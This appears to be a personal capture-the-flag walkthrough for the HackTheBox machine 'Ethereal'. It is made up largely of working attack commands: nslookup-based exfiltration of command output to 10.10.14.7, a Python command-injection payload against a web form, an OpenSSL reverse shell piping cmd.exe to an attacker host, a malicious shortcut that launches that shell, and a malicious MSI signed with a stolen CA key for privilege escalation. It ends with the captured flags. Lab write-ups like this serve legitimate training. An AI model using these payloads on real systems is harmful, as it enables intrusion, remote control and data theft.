### Check the md5 sum of orca.msi, then search on virustotal.com.
      
      jason> md5sum Orca.msi


Then go to [virustotal](virustotal.com) to check out the md5sum code and if there is any match.

### Mount downloaded disk file.
    
    jason> cd /mnt
    jason> mount DISK1 /DISK1
    jason> mount DISK2 /DISK2
    jason> mount FDISK /FDISK

    
### nslookup code injection    

    jason> responder
    burp> for /f %a in ('whoami') do (nslookup %a 10.10.14.7)
    burp> for /f "tokens=1-26" %a in ('{whatever the fuck}')  do nslookup Q%[a-z]Z. 10.10.14.7

If the above command failed, try this one.

    script> for /f "tokens=1-26" %a in ('cmd /c "{whatever the fuck}"') do nslookup Q%[a-z]Z. 10.10.14.7
    
    Then you got code execution from dns server
    
    burp> for /f "tokens=1,2,3,4,5,6" %a in ('dir') do (echo %a%b%c%d%e%f)
    
### Queryname Scapy Injection    

[DNS-Packet-Injector](https://github.com/bhutani92/DNS-Packet-Injector)
    
### Escalation    

Check environment varables.    

    > set 
    > whoami /all
    
**SeImpersonatePrivilage Bypass traverse checking Enabled** means you can try **Rotten Potato**.

Check if powershell works    
    > powershell whoami
    
Check Out Desktop.    
    > dir C:\users\alan\Desktop
    > dir C:\users\public\desktop
      
Check firewall    
    > netsh advfirewall firewall show rule name=all direction=out | findstr /c:Name:
    
Go to **Program Files**.
    > cd progra~1

Go to Program Files (x86).
    > cd progra~2
      
### LOLBAS Windows      
[LOLBAS-PROJECT](https://lolbas-project.github.io/)

### OpenSSL Reverse Shell 
[OpenSSL Reverse Shell](https://blog.inequationgroup.com/openssl-nc/)

Initialize openssl protocal    

    jason> openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    
Run this command on target to connect the input of cmd.exe onto the server listening at
[ip] on [port1] and output onto the the server listening at [ip] on [port2]

    target> openssl s_client -quiet -connect [ip]:[port1] | cmd.exe | openssl s_client -quiet -connect [ip]:[port2]
    jason> openssl s_server -key key.pem -cert cert.pem -port 73
    jason> openssl s_server -key key.pem -cert cert.pem -port 136
    
Add the shellcode script with the following code.
    
    def do_cmd(self, args):
        #cmd = f"""-n 1 127.0.0.1 && cmd /c "{args}" """
        cmd = f"""-n 1 127.0.0.1 && start cmd /c "{args}" """
        data = {
            '__VIEWSTATE':self.VS,
            '__VIEWSTATEGENERATOR':self.VSG,
            '__EVENTVALIDATION':self.EV,
            'search':cmd,
            'ctl02':self.CTL
        }
        auth = self.auth
        requests.post('http://ethereal.htb:8080', data=data, auth=auth)

Notice adding **start cmd /c**, without **start**, you may not get reverse shell. Because just with **cmd /c**, you can only get shell run on host terminal(Used by **Admin Console**).


    script> cmd c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.7:73 | cmd.exe | c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.7:136
    
### Escalation    

    box> cd c:\users\pubic\desktop
    box> icacls "Visual Studio 2017.lnk"
    box> echo "HELLO " > "Visual Studio 2017.lnk"
    
### Create a malicious shortcut    

    box> $WScript = New-Object -COM WScript.shell
    box> $SC = $WScript.CreateShortcut('Jasondidit.lnk')
    box> $SC
    box> $SC.TargetPath="C:\windows\system32\cmd.exe"
    box> $SC.Arguments="/c c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.7:73 | cmd.exe | c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.7:136"
    box> $SC.Save()
    box> dir
    
[Optional]Share file between windows machine and Linux machine.    
    
    jason> impacket-smbserver -smb2support files 'pwd'
    
Or you can directly download through python SimpleHTTP server

    jason> openssl s_server -key key.pem -cert cert.pem -port 73 < Jasondidit.lnk
    box> c:\progra~2\Openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.7:73 > C:\Users\Public\Desktop\Shortcuts\Jasondidit.lnk
    script> cmd copy /y C:\Users\Public\Desktop\Shortcuts\Jasondidit.lnk "C:\Users\Public\Desktop\Shortcuts\Visual Studio 2017.lnk"
    
### Create a malicious msi file.

    box> cd D:\Certs
    box> c:\progra~2\openssl-v1.1.0\bin\openssl.exe base64 -in MyCa.cer
    box> c:\progra~2\openssl-v1.1.0\bin\openssl.exe base64 -in MyCa.pvk
    
#### Download [WiX Toolset](https://github.com/wixtoolset/wix3/releases)

#### Create msi malicious file following this blog by [XPNSEC](https://blog.xpnsec.com/becoming-system/)
    windows> candle.exe my.wix
    windows> light.exe my.wixobj
    
#### Sign your msi file ( makecert.exe pvk2pfx.exe signtool.exe ) 

    windows> cd "C:\Porgram Files\{Windows SDK}\10\bin\{VERSION}\x64\"
    windows> echo $PATH
    windows> set PATH="C:\Porgram Files\{Windows SDK}\10\bin\{VERSION}\x64";%PATH%
    windows> makecert -n "CN=Ethereal" -pe -cy end -ic myca.cer -iv myca.pvk -sky signature -sv Jasondidit.pvk Jasondidit.cer
    windows> pvk2pfx -pvk Jasondidit.pvk -spc Jasondidit.cer -pfx Jasondidit.pfx
    windows> signtool sign /v /f Jasondidit.pfx my.msi
    
#### Transfer msi file through openssl tunnel.
    jason> openssl s_server -key key.pem -cert cert.pem -port 73 < my1.msi
    windows> cmd c:\progra~2\openssl-v1.1.0\bin\openssl.exe -quiet -connect 10.10.14.7:73 > c:\users\public\desktop\shortcuts\my1.msi
    
Use the copy and paste way to get jorge user access, then copy the msi file to d:\dev\msis
    windows> copy c:\users\public\desktop\shortcuts\my1.msi d:\dev\msis\
    
Then wait for a reverse shell hitting back.    

#### Get file size through powershell
    windows> powershell (Get-Item root.txt).length


Impersonate thing is different

    windows> cipher /c root.txt
    
    
### Flag     
User Flag **2b9a4ca09408b4a39d87cbcd7bd524dd**
Root Flag 1cb6f1fc220e3f2fcc0e3cd8e2d9906f

    
